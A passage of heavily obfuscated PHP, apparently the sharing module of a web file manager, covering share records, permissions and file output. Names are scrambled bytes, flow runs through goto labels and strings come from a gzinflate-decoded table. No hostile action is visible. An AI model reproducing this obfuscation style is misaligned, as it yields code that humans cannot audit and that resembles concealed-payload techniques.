$B‰»×µ¯ = Model($a¬â¯·éçµ[544])->createFileName($F–¹¯ğÏæŒ[$a¬â¯·éçµ[75]]); $eÔ¨…öî­ğ = IO::uploadLink($B‰»×µ¯, $a±ÒÇ‹¢ğ); return $eÔ¨…öî­ğ; } public function fileNameAuto($D“¸ŞãŞ …, $DòŠ¾¾¡­², $A‡‘öÒŸÂœ = REPEAT_REPLACE, $d¼‚Ê‡ßñÕ = false) { return $this->model->fileNameAuto($D“¸ŞãŞ …, $DòŠ¾¾¡­², $A‡‘öÒŸÂœ, $d¼‚Ê‡ßñÕ); } public function fileNameExist($a—ÒÓÈååÆ, $A†ò…ĞãÏç) { return $this->model->fileNameExist($a—ÒÓÈååÆ, $A†ò…ĞãÏç); } protected function _fileOut($b«‹ƒœß©³, $c„óµ×¢ = false, $bö£Âìá¿Á = false, $cë—æ®¢§ = '', $EˆÎê’’Ùƒ = false) { goto bÈŸÉ³ÖôË; a×¾ÒÑ¼”: $D£õ¯ôÒÌÔ = $this->model->fileInfoGet($b«‹ƒœß©³); $cë—æ®¢§ = $D£õ¯ôÒÌÔ[$D‘ñ†ÛĞë[163]] ? $D£õ¯ôÒÌÔ[$D‘ñ†ÛĞë[163]] : $cë—æ®¢§; $AÇ¤óˆßÇä = isset($GLOBALS[$D‘ñ†ÛĞë[1115]]) ? $GLOBALS[$D‘ñ†ÛĞë[1115]] : $C§ã®±¾õŠ[$D‘ñ†ÛĞë[28]]; goto aÄÃÂôÒ‚; bÈŸÉ³ÖôË: $D‘ñ†ÛĞë =& $_SERVER[îÖ]; $C§ã®±¾õŠ = $this->model->sourceInfo($b«‹ƒœß©³); if ($C§ã®±¾õŠ[$D‘ñ†ÛĞë[370]] == $D‘ñ†ÛĞë[83]) { header($D‘ñ†ÛĞë[1114]); die; } goto a×¾ÒÑ¼”; aÄÃÂôÒ‚: if ($EˆÎê’’Ùƒ) { return IO::fileOutServer($D£õ¯ôÒÌÔ[$D‘ñ†ÛĞë[75]], $c„óµ×¢, $AÇ¤óˆßÇä, $cë—æ®¢§); } IO::fileOut($D£õ¯ôÒÌÔ[$D‘ñ†ÛĞë[75]], $c„óµ×¢, $AÇ¤óˆßÇä, $cë—æ®¢§); goto DÊ¡óäÂĞ ; DÊ¡óäÂĞ : } public function fileOut($b”ŠÉƒÊæâ, $f”’®–«Îˆ = false, $aŞ×‘ïÛ„ = false, $C˜Ä¾’ŸÚ = '') { $this->_fileOut($b”ŠÉƒÊæâ, $f”’®–«Îˆ, $aŞ×‘ïÛ„, $C˜Ä¾’ŸÚ); } public function fileOutServer($A‘º¡ê³, $fƒœ³–ø… = false, $Dš‘»‰åæ· = false, $AëÈîÌÏ¢ = '') { $this->_fileOut($A‘º¡ê³, $fƒœ³–ø…, $Dš‘»‰åæ·, $AëÈîÌÏ¢, !0); } protected function _fileOutImage($c½µÊ„Ê·—, $Bçê•áÕÎÍ = 250) { $B»–õ‡ï…Ñ =& $_SERVER[îÖ]; $Båµæ–øª× = $this->model->sourceInfo($c½µÊ„Ê·—); if ($Båµæ–øª×[$B»–õ‡ï…Ñ[370]] == $B»–õ‡ï…Ñ[83]) { show_json($B»–õ‡ï…Ñ[1116] . $c½µÊ„Ê·—, !1); } $GLOBALS[$B»–õ‡ï…Ñ[1115]] = $Båµæ–øª×[$B»–õ‡ï…Ñ[28]]; $B·½Ùù ã¤ = $this->model->fileInfoGet($c½µÊ„Ê·—); IO::fileOutImage($B·½Ùù ã¤[$B»–õ‡ï…Ñ[75]], $Bçê•áÕÎÍ); } public function fileOutImage($eŞ×Ÿ†ã¥, $AŸÊ°‡¼™‚ = 250) { $this->_fileOutImage($eŞ×Ÿ†ã¥, $AŸÊ°‡¼™‚); } public function fileOutImageServer($BÎ¨¶â±, $AÇÖìö„ÄÃ = 250) { $this->_fileOutImage($BÎ¨¶â±, $AÇÖìö„ÄÃ); } public function link($Cî¨°…ÂÖ™, $f¿ªÊà’‚¢ = '') { $Aƒß¢Ü±•Ë = $this->model->fileInfoGet($Cî¨°…ÂÖ™); return IO::link($Aƒß¢Ü±•Ë[$_SERVER[îÖ][75]], $f¿ªÊà’‚¢); } protected function parse($E’–âƒõƒ) { $cä±ËµÒ¨ç =& $_SERVER[îÖ]; if (strstr($E’–âƒõƒ, $cä±ËµÒ¨ç[8]) === !1) { return array($cä±ËµÒ¨ç[385] => intval($E’–âƒõƒ), $cä±ËµÒ¨ç[75] => $cä±ËµÒ¨ç[33], $cä±ËµÒ¨ç[1112] => array()); } $EÈ…ä¾Úİ = explode($cä±ËµÒ¨ç[8], trim($E’–âƒõƒ, $cä±ËµÒ¨ç[8])); if (count($EÈ…ä¾Úİ) < 2) { show_tips($E’–âƒõƒ . $cä±ËµÒ¨ç[1117]); } return array($cä±ËµÒ¨ç[385] => intval($EÈ…ä¾Úİ[0]), $cä±ËµÒ¨ç[75] => $EÈ…ä¾Úİ[1], $cä±ËµÒ¨ç[1112] => array_slice($EÈ…ä¾Úİ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($aÌ¥¤„œÔ) { $this->pathParse = $aÌ¥¤„œÔ; $this->model = Model($_SERVER[îÖ][1111]); } public function getPathOuter($Fì“‹ Ä…ˆ) { $e¼ìÎĞÔ× =& $_SERVER[îÖ]; if (!$Fì“‹ Ä…ˆ) { return $Fì“‹ Ä…ˆ; } $b×ë­˜æ¶Ö = $this->parse($Fì“‹ Ä…ˆ); return trim(KodIO::makeShare($this->pathParse[$e¼ìÎĞÔ×[367]], $b×ë­˜æ¶Ö[$e¼ìÎĞÔ×[367]]), $e¼ìÎĞÔ×[8]); } protected function infoParse($fŸÌ§±é÷, $dµç¶”ÔÊ = false, $c­¢»„£Š = false) { $f¼İƒÒ¢˜‹ =& $_SERVER[îÖ]; $a¹ê«Ö‰¨‘ = $this->pathParse[$f¼İƒÒ¢˜‹[367]]; $Cøàøß¢­ = trim($this->pathParse[$f¼İƒÒ¢˜‹[1006]], $f¼İƒÒ¢˜‹[8]); return Action($f¼İƒÒ¢˜‹[1118])->sharePathInfo($a¹ê«Ö‰¨‘, $Cøàøß¢­); } public function infoFull($e‹«¤Ÿ´¶Š) { $e¬âäã¹¸ =& $_SERVER[îÖ]; $a—ÌÜ­‡í = explode($e¬âäã¹¸[8], trim($e‹«¤Ÿ´¶Š, $e¬âäã¹¸[8])); if (count($a—ÌÜ­‡í) > 1) { $AéÏïáò†Ò = implode($e¬âäã¹¸[8], array_splice($a—ÌÜ­‡í, 1)); $dÂÈì­êç = $this->model->pathInfoByPath($a—ÌÜ­‡í[0], $AéÏïáò†Ò); if (!$dÂÈì­êç) { return !1; } $this->pathParse[$e¬âäã¹¸[1006]] = $dÂÈì­êç[$e¬âäã¹¸[369]]; } return $this->infoParse($e‹«¤Ÿ´¶Š); } public function listAll($D‡¾¤±ÒÖİ) { goto F¶ƒİ„æäÚ; A ƒ¯ÍŸÚ‹: $A…¹©´† = $this->model->listAll($D‡¾¤±ÒÖİ); $bïÁàÖóŸ° = Model($A°®•îİóš[536])->getInfo($Dœé×…§ÁÔ[$A°®•îİóš[441]]); $EÈêÍß•¯Í = Action($A°®•îİóš[1118]); goto d…ìøƒŸäÀ; F¶ƒİ„æäÚ: $A°®•îİóš =& $_SERVER[îÖ]; $Dœé×…§ÁÔ = IO::info($this->pathParse[$A°®•îİóš[75]]); if (!$Dœé×…§ÁÔ) { return array(); } goto A ƒ¯ÍŸÚ‹; d…ìøƒŸäÀ: foreach ($A…¹©´† as &$Bñ½õ»„¬œ) { check_abort(); $Bñ½õ»„¬œ[$A°®•îİóš[391]] = $EÈêÍß•¯Í->_shareItemeParse($Bñ½õ»„¬œ[$A°®•îİóš[391]], $bïÁàÖóŸ°); } return $A…¹©´†; goto eŒ™Ë¿‡“©; eŒ™Ë¿‡“©: } } goto AÄ‹¿ˆ»œÏ; e©©Á¹óÔ: define($_SERVER[îÖ][0], $_SERVER[îÖ][1]); $_SERVER[©•ÖÏ¥Ø] = explode($_SERVER[îÖ][2], gzinflate(substr($_SERVER[îÖ][3], 10, -8))); function Model($eòÖÜ¤¿ƒ› = '', $f ²£¨ŞÓ„ = '', $cé‚Á–º«Ô = '') { goto câ»°§ß¬; A¯†·“ø•ô: if (isset($AĞÜèŒÇá[$e½Â…øùˆ•])) { return $AĞÜèŒÇá[$e½Â…øùˆ•]; } if ($eòÖÜ¤¿ƒ›) { $eòÖÜ¤¿ƒ› = strtoupper($eòÖÜ¤¿ƒ›[0]) . substr($eòÖÜ¤¿ƒ›, 1); $b—Àö’¸“í = $eòÖÜ¤¿ƒ› . $AÂ…‡Ş—ãÎ[1]; if (class_exists($b—Àö’¸“í)) { $AĞÜèŒÇá[$e½Â…øùˆ•] = new $b—Àö’¸“í(); return $AĞÜèŒÇá[$e½Â…øùˆ•]; } } if (!$cé‚Á–º«Ô) { $cé‚Á–º«Ô = $GLOBALS[$AÂ…‡Ş—ãÎ[2]][$AÂ…‡Ş—ãÎ[3]]; } goto C·Šø£ùÄ; câ»°§ß¬: $AÂ…‡Ş—ãÎ =& $_SERVER[©•ÖÏ¥Ø]; static $AĞÜèŒÇá = array(); $e½Â…øùˆ• = strtolower($f ²£¨ŞÓ„ . $AÂ…‡Ş—ãÎ[0] . $eòÖÜ¤¿ƒ›); goto A¯†·“ø•ô; C·Šø£ùÄ: $AĞÜèŒÇá[$e½Â…øùˆ•] = new ModelBase($eòÖÜ¤¿ƒ›, $f ²£¨ŞÓ„, $cé‚Á–º«Ô); return $AĞÜèŒÇá[$e½Â…øùˆ•]; goto eÖ‡¥Œë¨İ; eÖ‡¥Œë¨İ: } goto Aí…Ó¦²ò; AÅ¦âÚæÍÜ: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\x54\x69\x6d\145", "\x74\x69\155\145", "\x69\156\x73\x65\x72\x74\54\165\x70\144\x61\164\x65", "\x66\165\x6e\143\x74\151\x6f\x6e"), array("\x63\162\x65\x61\x74\145\124\151\155\x65", "\x74\x69\155\145", "\x69\156\x73\x65\x72\x74", "\146\x75\x6e\143\164\151\157\x6e"), array("\x6f\x70\164\151\157\x6e\x73", '', "\x69\x6e\x73\145\x72\164\54\165\160\x64\x61\x74\145\x2c\x73\145\x6c\145\143\164", "\x6a\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($cğÜ­õï¤Ó) { $dªÍ×’†À… =& $_SERVER[îÖ]; $aÁ§«³åš = isset($cğÜ­õï¤Ó[0]) ? $cğÜ­õï¤Ó[0] : !1; return array($dªÍ×’†À…[2207] => array(USER_ID, $dªÍ×’†À…[2208]), $dªÍ×’†À…[2167] => array($aÁ§«³åš, $dªÍ×’†À…[2209])); } protected function listSimple() { $E•¬‰‡¾“á = array($_SERVER[îÖ][1431] => USER_ID); $E¿³¿¼Ùë = $this->field($this->fieldList)->where($E•¬‰‡¾“á)->select(); return $E¿³¿¼Ùë ? $E¿³¿¼Ùë : array(); } protected function getInfo($aÏŠàËÕ…ğ, $dŒîğ¾ëŞ = false) { $aìÄœÛæ¬ =& $_SERVER[îÖ]; if ($dŒîğ¾ëŞ) { return $this->_getShareInfo(array($aìÄœÛæ¬[441] => $aÏŠàËÕ…ğ)); } $F¥•‹¨ø = $this->cacheFunctionGet($aìÄœÛæ¬[2210], $aÏŠàËÕ…ğ); return $F¥•‹¨ø; } public function getInfoByHash($Eõ‡”Ìêó ) { return $this->_getShareInfo(array($_SERVER[îÖ][443] => $Eõ‡”Ìêó )); } public function getInfoByPath($e…‰Ó¯æöÑ) { $dÖŠß–˜ê =& $_SERVER[îÖ]; $e‘ÅÜÌà…í = array($dÖŠß–˜ê[1431] => USER_ID, $dÖŠß–˜ê[369] => $e…‰Ó¯æöÑ); return $this->_getShareInfo($e‘ÅÜÌà…í); } public function getInfoBySourcePath($e’ìÖÏÒ†) { $dÚİ‰Üƒ”« =& $_SERVER[îÖ]; $eï‚ÃÏù¨Ù = array($dÚİ‰Üƒ”«[1431] => USER_ID, $dÚİ‰Üƒ”«[1013] => $e’ìÖÏÒ†); return $this->_getShareInfo($eï‚ÃÏù¨Ù); } private function _getShareInfo($F½“—˜·Û) { goto c‰çèèèÜ; fİËÜ¬ÇäÓ: if ($CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[369]] == $Fô¯ÏÎ­Óƒ[468]) { $CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[391]] = IO::info($CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[1013]]); } else { $CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[391]] = Model($Fô¯ÏÎ­Óƒ[1111])->pathInfo($CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[369]]); } $CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[2212]] = $AÀˆùÁåœã; return $CÔ¿ø¨Œ‡´; goto DãµÚ·Äê‹; F‚Êæ¬ˆî: $F½“—˜·Û = array($Fô¯ÏÎ­Óƒ[441] => $CÔ¿ø¨Œ‡´[$Fô¯ÏÎ­Óƒ[441]]); $dİÃ‹æµ— = $Fô¯ÏÎ­Óƒ[2211]; $AÀˆùÁåœã = Model($Fô¯ÏÎ­Óƒ[537])->order($Fô¯ÏÎ­Óƒ[367])->field($dİÃ‹æµ—)->where($F½“—˜·Û)->select(); goto fİËÜ¬ÇäÓ; c‰çèèèÜ: $Fô¯ÏÎ­Óƒ =& $_SERVER[îÖ]; $CÔ¿ø¨Œ‡´ = $this->where($F½“—˜·Û)->find(); if (!$CÔ¿ø¨Œ‡´) { return !1; } goto F‚Êæ¬ˆî; DãµÚ·Äê‹: } protected function getInfoAuth($fî·ëƒ†Œˆ) { $cËÆåÚŠÀÏ =& $_SERVER[îÖ]; $DÛß‡è = $this->getInfo($fî·ëƒ†Œˆ); $DÛß‡è[$cËÆåÚŠÀÏ[376]] = Model($cËÆåÚŠÀÏ[454])->authMake($DÛß‡è[$cËÆåÚŠÀÏ[2212]]); return $DÛß‡è; } protected function listData($eÍ”Û“šğ¥ = null, $CŸò‹“™À¡ = 300) { $a›Á¾É¶Ğí =& $_SERVER[îÖ]; $FÑ„÷ùŠ˜ = array(array($a›Á¾É¶Ğí[446] => array($a›Á¾É¶Ğí[920], 0), $a›Á¾É¶Ğí[448] => array($a›Á¾É¶Ğí[920], 0), $a›Á¾É¶Ğí[2213] => $a›Á¾É¶Ğí[2181])); if ($eÍ”Û“šğ¥ == $a›Á¾É¶Ğí[1865]) { $FÑ„÷ùŠ˜ = array($a›Á¾É¶Ğí[446] => 1); } else { if ($eÍ”Û“šğ¥ == $a›Á¾É¶Ğí[1002]) { $FÑ„÷ùŠ˜ = array($a›Á¾É¶Ğí[448] => 1); } } $FÑ„÷ùŠ˜[$a›Á¾É¶Ğí[1431]] = USER_ID; $F³÷ñ†¢×¡ = $this->where($FÑ„÷ùŠ˜)->selectPage($CŸò‹“™À¡); return $F³÷ñ†¢×¡; } protected function listToMe($cµø°Æ†Ï = 300) { goto Aéé„šŞ; f×æ¾é´–Ü: $Bİ„õ¸µÓĞ = array_to_keyvalue_group($aˆ‰‹Ÿ÷[$aöîŠƒ„Ù[354]], $aöîŠƒ„Ù[441]); if (!$Bİ„õ¸µÓĞ) { return $aˆ‰‹Ÿ÷; } $BŒÛ»¥¼£¤ = $aöîŠƒ„Ù[2215]; goto Fë‘‚£Öîô; Aéé„šŞ: $aöîŠƒ„Ù =& $_SERVER[îÖ]; $F†Îá´‡»§ = Session::get($aöîŠƒ„Ù[2214]); $E¼ã©’Õ†› = array_to_keyvalue($F†Îá´‡»§, $aöîŠƒ„Ù[33], $aöîŠƒ„Ù[2099]); goto FĞ‘¸—Ô‹Ş; Fë‘‚£Öîô: $fÒ…¦ÑÂ = array($aöîŠƒ„Ù[441] => array($aöîŠƒ„Ù[384], array_keys($Bİ„õ¸µÓĞ))); $cø£‹Ó ¿Õ = $this->field($BŒÛ»¥¼£¤)->where($fÒ…¦ÑÂ)->select(); foreach ($cø£‹Ó ¿Õ as $aÊù‘Ê’Ê† => &$Bš¤Ÿ†¡Ëò) { $Bš¤Ÿ†¡Ëò[$aöîŠƒ„Ù[2212]] = $Bİ„õ¸µÓĞ[$Bš¤Ÿ†¡Ëò[$aöîŠƒ„Ù[441]]]; } goto FˆŒïº±±²; FˆŒïº±±²: $Aš‚…Š‘Øˆ = array($aöîŠƒ„Ù[2216] => $cø£‹Ó ¿Õ, $aöîŠƒ„Ù[2217] => $aˆ‰‹Ÿ÷[$aöîŠƒ„Ù[351]]); return $Aš‚…Š‘Øˆ; goto e‡á…“‘èÆ; FĞ‘¸—Ô‹Ş: $fÒ…¦ÑÂ = array($aöîŠƒ„Ù[521] => SourceModel::TYPE_USER, $aöîŠƒ„Ù[456] => USER_ID); if ($E¼ã©’Õ†›) { $fÒ…¦ÑÂ = array(array($aöîŠƒ„Ù[521] => SourceModel::TYPE_USER, $aöîŠƒ„Ù[456] => USER_ID), array($aöîŠƒ„Ù[521] => SourceModel::TYPE_GROUP, $aöîŠƒ„Ù[456] => array($aöîŠƒ„Ù[7], $E¼ã©’Õ†›)), $aöîŠƒ„Ù[2213] => $aöîŠƒ„Ù[2181]); } $aˆ‰‹Ÿ÷ = Model($aöîŠƒ„Ù[537])->where($fÒ…¦ÑÂ)->selectPage($cµø°Æ†Ï); goto f×æ¾é´–Ü; e‡á…“‘èÆ: } protected function shareAdd($ešØïº¦õÚ, $E˜ÊÈÃÄ¿) { $A†¬†šŠ½‹ =& $_SERVER[îÖ]; $bàò£…ğÏÖ = $this->_addShareData($ešØïº¦õÚ, $E˜ÊÈÃÄ¿); if (!empty($E˜ÊÈÃÄ¿[$A†¬†šŠ½‹[2218]])) { $this->_shareAuthSet($bàò£…ğÏÖ, $E˜ÊÈÃÄ¿[$A†¬†šŠ½‹[2218]]); } $this->shareEventAdd($ešØïº¦õÚ, $E˜ÊÈÃÄ¿, $A†¬†šŠ½‹[1005]); return $bàò£…ğÏÖ; } private function shareEventAdd($dòê¨ÃÉñê, $C“ƒÅ¢³ˆÒ, $Cİ¯ª‰ëš¡ = "\x61\144\x64") { goto FâÆÉŸ‹ÀÀ; FâÆÉŸ‹ÀÀ: $fÀŠÙÈ–Ç¥ =& $_SERVER[îÖ]; if ($Cİ¯ª‰ëš¡ == $fÀŠÙÈ–Ç¥[1005]) { if ($C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[446]] == $fÀŠÙÈ–Ç¥[83]) { Model($fÀŠÙÈ–Ç¥[505])->eventShare($dòê¨ÃÉñê, $fÀŠÙÈ–Ç¥[2219]); } if ($C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[448]] == $fÀŠÙÈ–Ç¥[83]) { Model($fÀŠÙÈ–Ç¥[505])->eventShare($dòê¨ÃÉñê, $fÀŠÙÈ–Ç¥[2220]); } return; } $B¶éìã®º÷ = $this->getInfoByPath($dòê¨ÃÉñê); goto B¿İÓí¤ÌÂ; aº˜½İ: if ($B¶éìã®º÷[$fÀŠÙÈ–Ç¥[448]] == $fÀŠÙÈ–Ç¥[468] && $C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[448]] == $fÀŠÙÈ–Ç¥[83]) { $aÍÍš©¬Ó = $fÀŠÙÈ–Ç¥[2220]; } if ($B¶éìã®º÷[$fÀŠÙÈ–Ç¥[448]] == $fÀŠÙÈ–Ç¥[83] && $C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[448]] == $fÀŠÙÈ–Ç¥[468]) { $aÍÍš©¬Ó = $fÀŠÙÈ–Ç¥[2223]; } Model($fÀŠÙÈ–Ç¥[505])->eventShare($dòê¨ÃÉñê, $aÍÍš©¬Ó); goto bˆÜ´™×®Š; bˆÜ´™×®Š: return; goto F¾‹¨¤ã¬; B¿İÓí¤ÌÂ: $aÍÍš©¬Ó = $fÀŠÙÈ–Ç¥[2221]; if ($B¶éìã®º÷[$fÀŠÙÈ–Ç¥[446]] == $fÀŠÙÈ–Ç¥[468] && $C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[446]] == $fÀŠÙÈ–Ç¥[83]) { $aÍÍš©¬Ó = $fÀŠÙÈ–Ç¥[2219]; } if ($B¶éìã®º÷[$fÀŠÙÈ–Ç¥[446]] == $fÀŠÙÈ–Ç¥[83] && $C“ƒÅ¢³ˆÒ[$fÀŠÙÈ–Ç¥[446]] == $fÀŠÙÈ–Ç¥[468]) { $aÍÍš©¬Ó = $fÀŠÙÈ–Ç¥[2222]; } goto aº˜½İ; F¾‹¨¤ã¬: } private function _addShareData($f««Ş»êá, $D‹’çì¹Ö÷ = array()) { goto bºÈŠÉøÂ; Cº·Áˆ…„: if ($FÍÛß«Ì¬ë = $this->where($E‘¥ò¸Ç³ª)->find()) { return $FÍÛß«Ì¬ë[$eª¸ô®³‡ì[441]]; } if ($f««Ş»êá == 0) { $fäÑ»†êº = array($eª¸ô®³‡ì[28] => get_path_this($D‹’çì¹Ö÷[$eª¸ô®³‡ì[75]])); } else { $fäÑ»†êº = Model($eª¸ô®³‡ì[752])->sourceInfo($f««Ş»êá); if (!$fäÑ»†êº) { return !1; } } if (!$D‹’çì¹Ö÷[$eª¸ô®³‡ì[1337]]) { $D‹’çì¹Ö÷[$eª¸ô®³‡ì[1337]] = $fäÑ»†êº[$eª¸ô®³‡ì[28]]; } goto cƒª¥õ‹ëÙ; E³Ù–òÂš•: return $bóä‘Œ§¥‘; goto eš»¶ºğÓ¸; cƒª¥õ‹ëÙ: $D«ÓçÁ‡‚ = array($eª¸ô®³‡ì[1422] => USER_ID, $eª¸ô®³‡ì[383] => $f««Ş»êá, $eª¸ô®³‡ì[1337] => $eª¸ô®³‡ì[33], $eª¸ô®³‡ì[446] => 0, $eª¸ô®³‡ì[448] => 0, $eª¸ô®³‡ì[1013] => $eª¸ô®³‡ì[33], $eª¸ô®³‡ì[295] => $eª¸ô®³‡ì[33], $eª¸ô®³‡ì[796] => $eª¸ô®³‡ì[33], $eª¸ô®³‡ì[2225] => 0, $eª¸ô®³‡ì[2226] => 0, $eª¸ô®³‡ì[702] => 0, $eª¸ô®³‡ì[2227] => $eª¸ô®³‡ì[33], $eª¸ô®³‡ì[443] => $eª¸ô®³‡ì[33]); $F ©•¥ŸÚ… = explode($eª¸ô®³‡ì[47], $eª¸ô®³‡ì[2228]); foreach ($F ©•¥ŸÚ… as $eóÂ´ÃéíÒ) { if (!isset($D‹’çì¹Ö÷[$eóÂ´ÃéíÒ])) { continue; } $D«ÓçÁ‡‚[$eóÂ´ÃéíÒ] = $D‹’çì¹Ö÷[$eóÂ´ÃéíÒ]; } goto Eæ†òé‘Æ’; Eæ†òé‘Æ’: $bóä‘Œ§¥‘ = $this->add($D«ÓçÁ‡‚); $b–­˜Äù‘© = array($eª¸ô®³‡ì[443] => short_id($bóä‘Œ§¥‘)); $this->where(array($eª¸ô®³‡ì[440] => $bóä‘Œ§¥‘))->save($b–­˜Äù‘©); goto E³Ù–òÂš•; bºÈŠÉøÂ: $eª¸ô®³‡ì =& $_SERVER[îÖ]; $E‘¥ò¸Ç³ª = array($eª¸ô®³‡ì[383] => $f««Ş»êá, $eª¸ô®³‡ì[1422] => USER_ID); if ($f««Ş»êá == 0) { $E‘¥ò¸Ç³ª = array($eª¸ô®³‡ì[2224] => $D‹’çì¹Ö÷[$eª¸ô®³‡ì[1013]], $eª¸ô®³‡ì[1422] => USER_ID); } goto Cº·Áˆ…„; eš»¶ºğÓ¸: } private function _shareAuthSet($dŒ·…Ğéì‘, $AÁë¦©Åõ±) { goto b‡ß‹¢•‡; BÜË–ÌÆØŞ: $D„©åïæÚÚ->where(array($f”öéù©«[441] => $dŒ·…Ğéì‘))->delete(); $aµ”‚ªêáò = array(); foreach ($AÁë¦©Åõ± as $b„ƒ¯œîí) { $C½ùœ‹‡– = SourceModel::TYPE_USER; if ($b„ƒ¯œîí[$f”öéù©«[371]] == SourceModel::TYPE_GROUP) { $C½ùœ‹‡– = SourceModel::TYPE_GROUP; } $DÆ‹È„İ–¨ = array($f”öéù©«[441] => $dŒ·…Ğéì‘, $f”öéù©«[371] => $C½ùœ‹‡–, $f”öéù©«[456] => intval($b„ƒ¯œîí[$f”öéù©«[456]]), $f”öéù©«[2230] => 0, $f”öéù©«[2231] => -1); if ($b„ƒ¯œîí[$f”öéù©«[2230]]) { $DÆ‹È„İ–¨[$f”öéù©«[2230]] = $b„ƒ¯œîí[$f”öéù©«[2230]]; } else { if ($b„ƒ¯œîí[$f”öéù©«[2231]]) { $DÆ‹È„İ–¨[$f”öéù©«[2231]] = $b„ƒ¯œîí[$f”öéù©«[2231]]; } } $aµ”‚ªêáò[] = $DÆ‹È„İ–¨; } goto fæ˜°Æß£ª; b‡ß‹¢•‡: $f”öéù©« =& $_SERVER[îÖ]; if (!is_array($AÁë¦©Åõ±)) { return !1; } $D„©åïæÚÚ = Model($f”öéù©«[2229]); goto BÜË–ÌÆØŞ; fæ˜°Æß£ª: return $D„©åïæÚÚ->addAll($aµ”‚ªêáò, array(), !0); goto A†”Ä¨–ã–; A†”Ä¨–ã–: } public function numViewAdd($cèÍÅ½çØƒ) { $Dè¨Ö÷²¡‡ =& $_SERVER[îÖ]; $aµèâ­¥Ôã = array($Dè¨Ö÷²¡‡[440] => $cèÍÅ½çØƒ); $this->where($aµèâ­¥Ôã)->setAdd($Dè¨Ö÷²¡‡[2225]); } public function numDownloadAdd($B¤…óÈ¦ª) { $EĞ«ßÁ³ó =& $_SERVER[îÖ]; $E×¥Ã­Ê¥– = array($EĞ«ßÁ³ó[440] => $B¤…óÈ¦ª); $this->where($E×¥Ã­Ê¥–)->setAdd($EĞ«ßÁ³ó[2226]); } protected function shareEdit($F¦¬°Ş‚äÁ, $f”´µÛŠŸø) { goto cšƒİÎæ¥¶; DïÕ©¿ï³: if (isset($f”´µÛŠŸø[$eÈîÏÖôÆ÷[2218]])) { $this->_shareAuthSet($F¦¬°Ş‚äÁ, $f”´µÛŠŸø[$eÈîÏÖôÆ÷[2218]]); } return !0; goto cª› É§; Dì÷ÉØ›Í: $this->_checkLinkShare($f”´µÛŠŸø, $f†é£óËâ°); $Cƒ¢ˆ²âô = array(); $C×¡‘³İ„ = explode($eÈîÏÖôÆ÷[47], $eÈîÏÖôÆ÷[2232]); goto B¯ÆÖŠ„ø˜; B¯ÆÖŠ„ø˜: foreach ($C×¡‘³İ„ as $B‚ô‘…íĞª) { if (!array_key_exists($B‚ô‘…íĞª, $f”´µÛŠŸø)) { continue; } $Cƒ¢ˆ²âô[$B‚ô‘…íĞª] = $f”´µÛŠŸø[$B‚ô‘…íĞª]; } $this->shareEventAdd($f†é£óËâ°[$eÈîÏÖôÆ÷[369]], $f”´µÛŠŸø, $eÈîÏÖôÆ÷[2066]); $this->where(array($eÈîÏÖôÆ÷[440] => $F¦¬°Ş‚äÁ))->save($Cƒ¢ˆ²âô); goto DïÕ©¿ï³; cšƒİÎæ¥¶: $eÈîÏÖôÆ÷ =& $_SERVER[îÖ]; $f†é£óËâ° = $this->getInfo($F¦¬°Ş‚äÁ); if (!$f†é£óËâ°) { return !1; } goto Dì÷ÉØ›Í; cª› É§: } private function _checkLinkShare($FˆÂÀ÷Å¾ò, $aÇ©á˜×Šä) { goto FĞåİ‹·šª; Fë…ƒÏèÏç: $aŒ¤‚µˆ¤µ = $this->shareFileMeta($DÆÊìÀâÃœ[$e£âÆ³á˜İ[419]]); if (isset($aŒ¤‚µˆ¤µ[$e£âÆ³á˜İ[359]]) && $aŒ¤‚µˆ¤µ[$e£âÆ³á˜İ[359]] == $e£âÆ³á˜İ[83]) { show_json(LNG($e£âÆ³á˜İ[2235]), !1); } goto AÁêÆæìé†; D¨ÉÙÕÕ: if ($aÇ©á˜×Šä[$e£âÆ³á˜İ[391]][$e£âÆ³á˜İ[29]] != $e£âÆ³á˜İ[167]) { $b´áª¬ˆÏ = $this->_folderReport($A´Èµ¿ãù); if (!$b´áª¬ˆÏ) { return; } show_json(LNG($e£âÆ³á˜İ[2233]) . $e£âÆ³á˜İ[2234] . $b´áª¬ˆÏ, !1); } $DÆÊìÀâÃœ = Model($e£âÆ³á˜İ[752])->fileInfoGet($aÇ©á˜×Šä[$e£âÆ³á˜İ[391]][$e£âÆ³á˜İ[369]]); if (!$DÆÊìÀâÃœ) { return; } goto Fë…ƒÏèÏç; FĞåİ‹·šª: $e£âÆ³á˜İ =& $_SERVER[îÖ]; if ($FˆÂÀ÷Å¾ò[$e£âÆ³á˜İ[446]] != $e£âÆ³á˜İ[83]) { return; } $A´Èµ¿ãù = $aÇ©á˜×Šä[$e£âÆ³á˜İ[391]][$e£âÆ³á˜İ[369]]; goto D¨ÉÙÕÕ; AÁêÆæìé†: } private function _folderReport($a¸ŠÎ‰ñöŒ) { goto C¾‰ğğ—£ç; DìÄˆÇœì„: $D ²„ÔÒŒ = substr($b¨ˆ¼‹“‡ß[$d¸­ñ¤ØÜ[459]], strpos($b¨ˆ¼‹“‡ß[$d¸­ñ¤ØÜ[459]], $F›²ô×…ê)); $f§™ÒìÒ²× = array($d¸­ñ¤ØÜ[369] => array($d¸­ñ¤ØÜ[7], trim($D ²„ÔÒŒ, $d¸­ñ¤ØÜ[47]))); $f¦õ¤çŸÆœ = Model($d¸­ñ¤ØÜ[752])->where($f§™ÒìÒ²×)->field($d¸­ñ¤ØÜ[28])->select(); goto EĞï‡Ÿ›‹É; EĞï‡Ÿ›‹É: $bèĞ–í¨¬š = array_to_keyvalue($f¦õ¤çŸÆœ, $d¸­ñ¤ØÜ[33], $d¸­ñ¤ØÜ[28]); $bèĞ–í¨¬š[] = 